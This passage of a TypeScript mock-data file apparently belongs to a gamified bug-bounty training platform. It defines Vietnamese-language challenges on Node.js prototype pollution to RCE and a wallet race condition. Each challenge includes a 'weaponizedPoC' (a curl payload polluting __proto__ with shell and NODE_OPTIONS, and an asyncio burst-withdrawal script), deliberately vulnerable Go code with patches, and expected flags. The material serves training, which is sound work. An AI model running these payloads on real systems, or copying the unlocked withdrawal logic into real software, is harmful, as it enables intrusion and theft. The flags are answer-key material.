        '    return target;\n' +
        '}',
    },
    writeup: {
      title: 'Node.js Prototype Pollution to RCE Analysis',
      cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H',
      vulnerabilityOverview:
        'Prototype Pollution xảy ra khi kẻ tấn công có thể sửa đổi Object.prototype trong JavaScript runtime, khiến tất cả các object mới sinh ra đều kế thừa thuộc tính độc hại.',
      rootCauseAnalysis:
        'Các hàm merge đệ quy không validate thuộc tính đặc biệt __proto__. Khi kết hợp với các hàm hệ thống như child_process.spawn() (thường đọc options.shell từ object cấu hình), việc ô nhiễm shell: "/bin/sh" dẫn đến RCE.',
      exploitChainWalkthrough: [
        'Bước 1: Tìm endpoint nhận JSON body và thực hiện merge.',
        'Bước 2: Gửi JSON có key __proto__.',
        'Bước 3: Kiểm tra biến môi trường hoặc kích hoạt hành động gọi fork/spawn để nhận reverse shell.',
      ],
      weaponizedPoC:
        'curl -X POST http://10.0.4.45:3000/api/v1/user/settings \\\n  -H "Content-Type: application/json" \\\n  -d \'{"preferences":{"__proto__":{"shell":"/bin/sh","NODE_OPTIONS":"--require /tmp/poc.js"}}}\'',
      remediationSnippet:
        '// Sử dụng Object.create(null) để tạo object không có prototype:\nconst safeDict = Object.create(null);\n// Hoặc đóng băng prototype khi khởi động ứng dụng:\nObject.freeze(Object.prototype);',
    },
  },

  // ─────────────────────────────────────────────────────────────
  // 6. BB-RACE-03: Concurrency Race Condition
  // ─────────────────────────────────────────────────────────────
  {
    id: 'bb-race-03-limit-overrun',
    title: 'Financial Concurrency Race Condition & Balance Overrun',
    category: 'bug-bounty',
    severity: 'high',
    cvssScore: 8.5,
    bountyReward: 3500,
    xpReward: 650,
    estimatedMinutes: 15,
    targetHost: '10.0.4.50',
    targetPort: 443,
    tagline:
      'Khai thác thời gian chênh lệch (TOCTOU) giữa lúc kiểm tra số dư và trừ tiền trong cơ sở dữ liệu.',
    scenarioBriefing:
      'Cổng thanh toán xử lý giao dịch chuyển tiền qua 2 câu lệnh SQL riêng biệt: SELECT balance FROM accounts và UPDATE accounts SET balance = balance - amount. Khi gửi 10 request đồng thời qua HTTP Repeater với kết nối TCP burst, kẻ tấn công có thể rút tiền vượt quá số dư hiện có.',
    keyObjectives: [
      'Gửi 5–10 request chuyển tiền đồng thời qua HTTP Repeater với cùng Transaction Token.',
      'Khai thác thành công trạng thái Limit-Overrun để số dư vượt âm.',
      'Nhận Flag xác nhận từ phản hồi hệ thống.',
    ],
    expectedFlag: 'OS_0DAY{concurrency_race_condition_double_spend_success}',
    firstBloodHolder: {
      handle: '@red_samurai',
      timeRecord: '07m 30s',
    },
    supportedTools: ['repeater', 'diff'],
    defaultTool: 'repeater',
    repeaterConfig: {
      defaultMethod: 'POST',
      defaultUrl: '/api/v1/wallet/withdraw',
      defaultRawHeaders:
        'Host: 10.0.4.50:443\n' +
        'Authorization: Bearer test_operator_token\n' +
        'Content-Type: application/json\n' +
        'X-Concurrency-Burst: true\n' +
        'Connection: keep-alive',
      defaultBody: '{"amount": 1000, "recipient_account": "ACC-998822"}',
      targetEndpoint: 'https://10.0.4.50/api/v1/wallet/withdraw',
      simulatedResponses: {
        baseResponse: {
          statusCode: 200,
          statusText: 'OK',
          headers: { 'Content-Type': 'application/json' },
          body: '{"status": "SUCCESS", "remaining_balance": 0, "message": "Withdrawal of $1000 processed."}',
        },
        exploitedResponse: {
          statusCode: 200,
          statusText: 'OK (RACE DETECTED)',
          headers: {
            'Content-Type': 'application/json',
            'X-Race-Condition-Exploited': '5x_CONCURRENT_TRANSACTIONS_ACCEPTED',
          },
          body:
            '{\n' +
            '  "status": "LIMIT_OVERRUN_SUCCESS",\n' +
            '  "transactions_executed": 5,\n' +
            '  "total_withdrawn": 5000,\n' +
            '  "initial_balance": 1000,\n' +
            '  "final_balance": -4000,\n' +
            '  "bounty_flag": "OS_0DAY{concurrency_race_condition_double_spend_success}"\n' +
            '}',
          proofFlag: 'OS_0DAY{concurrency_race_condition_double_spend_success}',
        },
      },
    },
    diffConfig: {
      filename: 'wallet_service.go',
      language: 'go',
      vulnerableLineStart: 15,
      vulnerableLineEnd: 24,
      rootCauseExplanation:
        'Không sử dụng câu lệnh khóa dòng bi-directional (SELECT FOR UPDATE) hoặc Optimistic Concurrency Control (OCC) trong transaction cơ sở dữ liệu, tạo ra khoảng trống Time-of-Check to Time-of-Use (TOCTOU).',
      taintSink: 'db.Exec("UPDATE accounts SET balance = balance - ?", amount)',
      vulnerableCode:
        '// vulnerable_wallet.go\n' +
        'func ProcessWithdraw(db *sql.DB, accountID int, amount float64) error {\n' +
        '    var balance float64\n' +
        '    // LỖ HỔNG: Đọc số dư không có Row Lock (SELECT FOR UPDATE)!\n' +
        '    db.QueryRow("SELECT balance FROM accounts WHERE id = ?", accountID).Scan(&balance)\n' +
        '    if balance < amount {\n' +
        '        return errors.New("insufficient funds")\n' +
        '    }\n' +
        '    time.Sleep(50 * time.Millisecond) // Giả lập độ trễ I/O\n' +
        '    _, err := db.Exec("UPDATE accounts SET balance = balance - ? WHERE id = ?", amount, accountID)\n' +
        '    return err\n' +
        '}',
      patchedCode:
        '// patched_wallet.go (Atomic Row Lock Fix)\n' +
        'func ProcessWithdrawSafe(tx *sql.Tx, accountID int, amount float64) error {\n' +
        '    var balance float64\n' +
        '    // BẢN VÁ: Khóa dòng ngay lập tức bằng SELECT FOR UPDATE trong Transaction\n' +
        '    err := tx.QueryRow("SELECT balance FROM accounts WHERE id = ? FOR UPDATE", accountID).Scan(&balance)\n' +
        '    if err != nil || balance < amount {\n' +
        '        return errors.New("insufficient funds or account locked")\n' +
        '    }\n' +
        '    _, err = tx.Exec("UPDATE accounts SET balance = balance - ? WHERE id = ?", amount, accountID)\n' +
        '    return err\n' +
        '}',
    },
    writeup: {
      title: 'Concurrency Limit-Overrun Race Conditions in Modern Web APIs',
      cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N',
      vulnerabilityOverview:
        'Race conditions trong API tài chính xảy ra khi nhiều luồng thực thi đồng thời kiểm tra cùng một trạng thái trước khi bất kỳ luồng nào kịp cập nhật kết quả.',
      rootCauseAnalysis:
        'Sự thiếu vắng các cơ chế đồng bộ hóa nguyên tử (Atomic locks / Mutex / Database Row Locking) cho phép kẻ tấn công gửi đồng thời nhiều gói tin qua kỹ thuật TCP Packet Alignment để vượt giới hạn.',
      exploitChainWalkthrough: [
        'Bước 1: Soạn thảo 10 HTTP requests rút tiền trong HTTP Repeater.',
        'Bước 2: Gửi đồng thời bằng single-packet attack hoặc HTTP/2 multiplexing.',
        'Bước 3: Nhận phản hồi nhiều giao dịch thành công dù số dư chỉ đủ cho 1 giao dịch.',
      ],
      weaponizedPoC:
        'import asyncio, aiohttp\nasync def attack():\n    async with aiohttp.ClientSession() as s:\n        tasks = [s.post("https://10.0.4.50/api/v1/wallet/withdraw", json={"amount": 1000}) for _ in range(10)]\n        await asyncio.gather(*tasks)\nasyncio.run(attack())',
      remediationSnippet:
        '// Sử dụng câu lệnh UPDATE nguyên tử có điều kiện:\nUPDATE accounts SET balance = balance - 1000 WHERE id = 123 AND balance >= 1000;\n// Kiểm tra RowsAffected == 1',
    },
  },
];

export const MOCK_ARENA_RIVALS: ArenaRival[] = [
  {
    id: 'rival-1',
    rank: 1,
    handle: '@hex_master',
    avatarText: '0D',
    avatarBg: 'from-amber-600 to-yellow-400',
    title: '0-Day Grandmaster',
    categorySpecialty: 'Memory Corruption & Binary Exploits',
    solvedCount: 18,
    firstBloods: 12,
    totalBounty: 85000,
    totalXp: 5900,
    badge: '🏆 Season Champion',
  },
  {
    id: 'rival-2',
    rank: 2,
    handle: '@cloud_phantom',
    avatarText: 'CR',
    avatarBg: 'from-sky-600 to-cyan-400',
    title: 'Cloud Breaker',
    categorySpecialty: 'AWS / GCP / K8s Metadata SSRF',
    solvedCount: 16,
    firstBloods: 8,
    totalBounty: 64500,
    totalXp: 4850,
    badge: '⚡ Cloud Hunter',
  },
  {
    id: 'rival-3',
    rank: 3,
    handle: '@pwn_samurai',
    avatarText: 'PW',
    avatarBg: 'from-purple-600 to-pink-500',
    title: 'CVE Specialist',
    categorySpecialty: '1-Day Weaponization & JNDI/RCE',
    solvedCount: 14,
    firstBloods: 5,
    totalBounty: 52000,
    totalXp: 4100,
    badge: '💣 1-Day Specialist',
  },
  {
    id: 'rival-4',
    rank: 4,
    handle: '@ghost_zero',
    avatarText: 'GZ',
    avatarBg: 'from-rose-600 to-red-400',
    title: 'Active Directory Lord',
    categorySpecialty: 'Kerberos & Domain Dominance',
    solvedCount: 12,
    firstBloods: 4,
    totalBounty: 42500,
    totalXp: 3500,
    badge: '👑 AD Dominator',
  },
  {
    id: 'rival-5',
    rank: 5,
    handle: '@red_samurai',
    avatarText: 'RS',
    avatarBg: 'from-emerald-600 to-teal-400',
    title: 'Web Bounty Hunter',
    categorySpecialty: 'Business Logic & Concurrency',
    solvedCount: 10,
    firstBloods: 3,
    totalBounty: 33000,
    totalXp: 2800,
    badge: '🎯 Logic Hunter',
  },
];

export const MOCK_LIVE_ACTIVITY_FEED: LiveActivityFeedItem[] = [
  {
    id: 'feed-1',
    timestampMinutesAgo: 2,
    rivalHandle: '@hex_master',
    challengeTitle: 'Citrix Bleed Unauthenticated Session Memory Dump',
    bountyWon: 5000,
    isFirstBlood: true,
  },
  {
    id: 'feed-2',
    timestampMinutesAgo: 14,
    rivalHandle: '@cloud_phantom',
    challengeTitle: 'Cloud SSRF to AWS IMDSv2 Token Bypass',
    bountyWon: 4500,
  },
  {
    id: 'feed-3',
    timestampMinutesAgo: 32,
    rivalHandle: '@ghost_zero',
    challengeTitle: 'Active Directory Kerberoasting & Ticket Cracking',
    bountyWon: 4000,
    isFirstBlood: true,
  },
  {
    id: 'feed-4',
    timestampMinutesAgo: 55,
    rivalHandle: '@pwn_samurai',
    challengeTitle: 'Log4Shell JNDI LDAP Remote Code Execution',
    bountyWon: 5000,
  },
];
